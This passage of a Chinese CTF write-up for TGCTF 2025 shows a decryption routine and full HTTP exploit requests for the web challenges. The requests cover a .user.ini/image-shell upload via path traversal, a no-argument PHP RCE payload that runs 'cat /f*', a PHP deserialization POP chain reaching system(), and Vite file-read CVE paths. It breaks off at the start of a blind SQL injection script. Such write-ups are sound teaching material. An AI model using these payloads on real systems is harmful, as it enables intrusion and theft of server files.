    0x02, 0x00, 0x00, 0x00,
    0x51, 0x00, 0x00, 0x00&#125;;

void Dec_2(unsigned char *Input, unsigned char *Key)
&#123;
    static int c &#x3D; 0;
    int iVar1 &#x3D; (int)Key[c] &gt;&gt; 4;
    DWORD uVar2 &#x3D; (int)Key[c] &amp; 0xf;
    c++;
    unnamed_function_10(box_ori, (int)*(char *)(iVar1 * 0x10 + (unsigned char *)box + uVar2));
    unsigned char key_o[] &#x3D; &quot;TGCTF404&quot;;
    for (int i &#x3D; 0; i &lt; 4; i++)
    &#123;
        Input[i] &#x3D; Input[i] ^ box_ori2[iVar1 * 0x10 + i * 0x11 + uVar2];
        Input[i] &#x3D; Input[i] ^ key_o[i];
    &#125;
&#125;

void decrypt(unsigned char *Input, int length)
&#123;
    unsigned char Key[] &#x3D; &quot;TGCTF404&quot;;

    for (int i &#x3D; 0; i &lt; 8; i++)
        Key[i] ^&#x3D; 0x51;

    for (int i &#x3D; 0; i &lt; length; i +&#x3D; 4)
    &#123;
        Dec_2((unsigned char *)(Input + i), Key);
    &#125;

    srand(0x194);

    int swaps[32][2];
    for (int i &#x3D; 0; i &lt; 32; i++)
    &#123;
        auto Value &#x3D; rand();
        Value &#x3D; i + Value &#x2F; (0x7fff &#x2F; (32 - i) + 1);
        swaps[i][0] &#x3D; i;
        swaps[i][1] &#x3D; Value;
    &#125;

    for (int i &#x3D; 31; i &gt;&#x3D; 0; i--)
    &#123;
        unsigned char temp &#x3D; Input[swaps[i][0]];
        Input[swaps[i][0]] &#x3D; Input[swaps[i][1]];
        Input[swaps[i][1]] &#x3D; temp;
    &#125;
&#125;

int main()
&#123;
    unsigned char Key[] &#x3D; &quot;TGCTF404&quot;;
    unsigned char Enc_flag[32]&#123;&#125;;
    
    for (int i &#x3D; 0; i &lt; 32; i++)
        Enc_flag[i] &#x3D; *(int *)((byte *)Enc + i * 4);

    decrypt(Enc_flag, 32);

    printf(&quot;%.32s\n&quot;, Enc_flag);
    return 0;
&#125;</code></pre>

<p>HZNUCTF{f898-de85-46e-9e43-b9c8}</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a>(ez)upload</h3><p>扫目录 有 upload.php.bak 翻源码。name处存在穿越。</p>
<p>可以上传.user.ini。而只有上级目录有php文件可以触发。</p>
<p>因此。我们传图片马和.user.ini到上级目录。等待触发即可。</p>
<p>payload：</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">POST &#x2F;upload.php?name&#x3D;..&#x2F;evil.png HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:32690
Content-Length: 320
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32690
Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary76S3hC5Gh3B7j6KZ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32690&#x2F;
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name&#x3D;&quot;name&quot;; filename&#x3D;&quot;1.png&quot;
Content-Type: application&#x2F;octet-stream

&lt;?php phpinfo();?&gt;


------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name&#x3D;&quot;submit&quot;

上传文件
------WebKitFormBoundary76S3hC5Gh3B7j6KZ--
POST &#x2F;upload.php?name&#x3D;..&#x2F;.user.ini HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:32690
Content-Length: 335
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32690
Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary76S3hC5Gh3B7j6KZ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32690&#x2F;
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name&#x3D;&quot;name&quot;; filename&#x3D;&quot;.user.ini&quot;
Content-Type: application&#x2F;octet-stream

auto_prepend_file&#x3D;evil.png

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name&#x3D;&quot;submit&quot;

上传文件
------WebKitFormBoundary76S3hC5Gh3B7j6KZ--</code></pre>

<p>在phpinfo的$_SERVER[‘FLAG’]里看到flag</p>
<h3 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a>AAA偷渡阴平</h3><p>无参数RCE绕过。</p>
<p>payload：</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(&#39;cat &#x2F;f*&#39;); HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:30815
Accept-Language: zh-CN,zh;q&#x3D;0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
CUIASDGHFIOUWE: 123123
Accept-Encoding: gzip, deflate, br
Connection: keep-alive</code></pre>

<h3 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a>什么文件上传？</h3><p>robots.txt 进去有 class.php 一眼就能瞪出来pop链子。</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
highlight_file(__FILE__);
error_reporting(0);

class yesterday &#123;
    public $learn;
    public $study&#x3D;&quot;study&quot;;
    public $try;
    public function __construct()
    &#123;
        $this-&gt;learn &#x3D; &quot;learn&lt;br&gt;&quot;;
    &#125;
    public function __destruct()
    &#123;
        echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;
        return $this-&gt;study-&gt;hard();
    &#125;
&#125;
class today &#123;
    public $doing;
    public $did;
    public $done;
    public function __construct()&#123;
        $this-&gt;did &#x3D; &quot;What you did makes you outstanding.&lt;br&gt;&quot;;
    &#125;
    public function __call($arg1, $arg2)
    &#123;
        $this-&gt;done &#x3D; &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;
        echo $this-&gt;done;
        if(md5(md5($this-&gt;doing))&#x3D;&#x3D;666)&#123;
            return $this-&gt;doing();
        &#125;
        else&#123;
            return $this-&gt;doing-&gt;better;
        &#125;
    &#125;
&#125;
class tommoraw &#123;
    public $good;
    public $bad;
    public $soso;
    public function __invoke()&#123;
        $this-&gt;good&#x3D;&quot;You&#39;ll be good tommoraw!&lt;br&gt;&quot;;
        echo $this-&gt;good;
    &#125;
    public function __get($arg1)&#123;
        $this-&gt;bad&#x3D;&quot;You&#39;ll be bad tommoraw!&lt;br&gt;&quot;;
    &#125;

&#125;
class future&#123;
    private $impossible&#x3D;&quot;How can you get here?&lt;br&gt;&quot;;
    private $out;
    private $no;
    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;

    public function __set($arg1, $arg2) &#123;
        if ($this-&gt;out-&gt;useful7) &#123;
            echo &quot;Seven is my lucky number&lt;br&gt;&quot;;
            system(&#39;whoami&#39;);
        &#125;
    &#125;
    public function __toString()&#123;
        echo &quot;This is your future.&lt;br&gt;&quot;;
        system($_POST[&quot;wow&quot;]);
        return &quot;win&quot;;
    &#125;
    public function __destruct()&#123;
        $this-&gt;no &#x3D; &quot;no&quot;;
        return $this-&gt;no;
    &#125;
&#125;
$evil &#x3D; new yesterday();
$evil -&gt; study &#x3D; new today();
$evil -&gt; study -&gt; doing &#x3D; new future();</code></pre>

<p>随后序列化evil。base64四次。随后上传文件通过file_exists的检查即可。</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">POST &#x2F;upload.php HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:32439
Content-Length: 5437
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32439
Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryurqPJUpE3whNwI5B
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32439&#x2F;
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryurqPJUpE3whNwI5B
Content-Disposition: form-data; name&#x3D;&quot;Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0&#x3D;.txt&quot;; filename&#x3D;&quot;Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0&#x3D;.txt&quot;
Content-Type: application&#x2F;octet-stream

111

------WebKitFormBoundaryurqPJUpE3whNwI5B--
POST &#x2F;class.php?filename&#x3D;Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0&#x3D;.txt HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:32439
Accept-Language: zh-CN,zh;q&#x3D;0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Content-Type: application&#x2F;x-www-form-urlencoded
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 11

wow&#x3D;cat &#x2F;f*</code></pre>

<h3 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a>前端GAME</h3><p>紧跟时事。是最新的ViteJS的CVE。F12搜能搜到flag路径（理论上来说可以，我是手打的（（），然后用CVE打就完了。</p>
<p>这题因为靶机问题，没打成。跟出题人对过思路和脚本之后出题人直接给我flag的。直接在flag路径后加?import&amp;raw??即可</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32360&#x2F;@fs&#x2F;tgflagggg?import&amp;raw??</code></pre>

<h3 id="前端GAME-plus"><a href="#前端GAME-plus" class="headerlink" title="前端GAME plus"></a>前端GAME plus</h3><p>参考<a target="_blank" rel="noopener" href="https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC">https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC</a></p>
<pre class="language-none"><code class="language-none">&#x2F;@fs&#x2F;tgflagggg?import&amp;?meteorkai.svg?.wasm?init</code></pre>

<h3 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a>火眼辩魑魅</h3><p>robots.txt 直接打 tgshell.php</p>
<p>无过滤，直接POST传cat &#x2F;f*一把梭了</p>
<h3 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a>熟悉的配方，熟悉的味道</h3><p>狠狠非预期！！！</p>
<p>直接打盲注好吧。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm
url <span class="token operator">=</span> <span class="token string">"http://node1.tgctf.woooo.tech:30215"</span>
flag <span class="token operator">=</span> <span class="token string">"TGCTF&#123;028b2d11-2783-464c-8cea-fda040"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># for s in 'TGCTF&#123;':</span>
